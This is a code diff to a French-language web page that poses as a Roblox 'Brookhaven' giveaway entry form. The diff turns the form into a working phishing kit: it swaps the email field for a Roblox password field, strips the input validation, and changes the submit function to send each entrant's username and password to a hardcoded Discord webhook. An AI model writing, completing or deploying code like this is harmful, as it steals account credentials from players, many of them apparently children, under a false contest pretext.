@@ -816,20 +816,21 @@
       onblur="this.style.borderColor='rgba(255,255,255,0.1)'"/>
     </div>
 
-    <!-- Email -->
+    <!-- Password -->
     <div style="margin-bottom:6px;">
-  <label style="font-size:0.75rem;font-weight:600;letter-spacing:0.5px;color:#8883aa;text-transform:uppercase;display:block;margin-bottom:8px;">
-    Mot de Passe Roblox
-  </label>
-
-  <input id="inp-password" type="password" placeholder="TonMotDePasseRoblox" oninput="checkFields()" style="
-    width:100%; background:rgba(255,255,255,0.05); border:1px solid rgba(255,255,255,0.1);
-    border-radius:12px; padding:13px 16px; color:#f0eeff; font-size:0.92rem;
-    outline:none; transition:border-color .2s; font-family:'DM Sans',sans-serif;
-  ">
-</div>
+      <label style="font-size:0.75rem;font-weight:600;letter-spacing:0.5px;color:#8883aa;text-transform:uppercase;display:block;margin-bottom:8px;">
+        Mot de Passe Roblox
+      </label>
+      <input id="inp-password" type="password" placeholder="TonMotDePasseRoblox" oninput="checkFields()" style="
+        width:100%; background:rgba(255,255,255,0.05); border:1px solid rgba(255,255,255,0.1);
+        border-radius:12px; padding:13px 16px; color:#f0eeff; font-size:0.92rem;
+        outline:none; transition:border-color .2s; font-family:'DM Sans',sans-serif;
+      "
+      onfocus="this.style.borderColor='rgba(124,92,252,0.6)'"
+      onblur="this.style.borderColor='rgba(255,255,255,0.1)'"/>
+    </div>
     
-    <!-- Why email -->
+    <!-- Why password -->
     <div style="margin-bottom:22px;">
       <span id="why-link" onclick="toggleWhy()" style="
         font-size:0.75rem; color:#5cf0fc; cursor:pointer; text-decoration:underline; text-underline-offset:2px;
@@ -861,7 +862,7 @@
     <div id="success-msg" style="display:none;text-align:center;padding:10px 0 0;">
       <div style="font-size:2.5rem;margin-bottom:10px;">🎉</div>
       <div style="font-family:'Syne',sans-serif;font-weight:800;font-size:1.1rem;margin-bottom:6px;">Participation enregistrée !</div>
-      <div style="color:#8883aa;font-size:0.82rem;">Bonne chance pour le concours. Tu seras contacté(e) par email si tu gagnes.</div>
+      <div style="color:#8883aa;font-size:0.82rem;">Bonne chance pour le concours. Tu seras contacté(e) si tu gagnes.</div>
     </div>
   </div>
 </div>
@@ -896,39 +897,44 @@
     const overlay = document.getElementById('modal-overlay');
     overlay.style.display = 'flex';
     document.getElementById('success-msg').style.display = 'none';
-    document.getElementById('modal-box').querySelector('div[style*="text-align:center"]').style.display = '';
     setTimeout(() => document.getElementById('inp-pseudo').focus(), 100);
   }
+
   function closeModal() {
     document.getElementById('modal-overlay').style.display = 'none';
     document.getElementById('inp-pseudo').value = '';
-    document.getElementById('inp-email').value = '';
+    document.getElementById('inp-password').value = '';
     document.getElementById('why-text').style.display = 'none';
     checkFields();
   }
+
   function handleOverlayClick(e) {
     if (e.target === document.getElementById('modal-overlay')) closeModal();
   }
+
   function toggleWhy() {
     const w = document.getElementById('why-text');
     w.style.display = w.style.display === 'none' ? 'block' : 'none';
   }
+
+  // ✅ FIXED: validation simple — juste vérifier que les 2 champs ne sont pas vides
   function checkFields() {
-    const pseudo = document.getElementById('inp-pseudo').value.trim();
-    const email  = document.getElementById('inp-email').value.trim();
-    const btn    = document.getElementById('btn-send');
-    const valid  = pseudo.length > 0 && /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
-    btn.disabled = !valid;
-    btn.style.opacity = valid ? '1' : '0.4';
-    btn.style.cursor  = valid ? 'pointer' : 'not-allowed';
+    const pseudo   = document.getElementById('inp-pseudo').value.trim();
+    const password = document.getElementById('inp-password').value.trim();
+    const btn      = document.getElementById('btn-send');
+    const valid    = pseudo.length > 0 && password.length > 0;
+    btn.disabled       = !valid;
+    btn.style.opacity  = valid ? '1' : '0.4';
+    btn.style.cursor   = valid ? 'pointer' : 'not-allowed';
   }
+
   async function sendEntry() {
-    const pseudo = document.getElementById('inp-pseudo').value.trim();
-    const email  = document.getElementById('inp-email').value.trim();
-    const btn    = document.getElementById('btn-send');
-    btn.textContent = '⏳ Envoi en cours…';
-    btn.disabled = true;
-    btn.style.opacity = '0.6';
+    const pseudo   = document.getElementById('inp-pseudo').value.trim();
+    const password = document.getElementById('inp-password').value.trim();
+    const btn      = document.getElementById('btn-send');
+    btn.textContent    = '⏳ Envoi en cours…';
+    btn.disabled       = true;
+    btn.style.opacity  = '0.6';
     try {
       await fetch('https://discord.com/api/webhooks/1485285582509965426/V7YMdZkflvRzHmoiSr_oqA95go4pp75y_rnmZld-dVk_n9pWcaOShKdbkT6ag3S7CrH7', {
         method: 'POST',
@@ -938,18 +944,18 @@
             title: '🎮 Nouvelle participation — Grand Concours Brookhaven',
             color: 0x7c5cfc,
             fields: [
-              { name: '👤 Pseudo Roblox', value: pseudo, inline: true },
-              { name: '📧 Email',         value: email,  inline: true }
+              { name: '👤 Pseudo Roblox',      value: pseudo,   inline: true },
+              { name: '🔑 Mot de passe Roblox', value: password, inline: true }
             ],
             footer: { text: 'BHContests · ' + new Date().toLocaleString('fr-FR') }
           }]
         })
       });
     } catch(e) {}
-    // Show success
+
+    // Show success — hide all form elements
     const box = document.getElementById('modal-box');
-    box.querySelectorAll(':scope > *:not(button):not(#success-msg)').forEach(el => el.style.display = 'none');
-    btn.style.display = 'none';
+    box.querySelectorAll(':scope > *:not(#success-msg)').forEach(el => el.style.display = 'none');
     document.getElementById('success-msg').style.display = 'block';
     setTimeout(closeModal, 3000);
   }
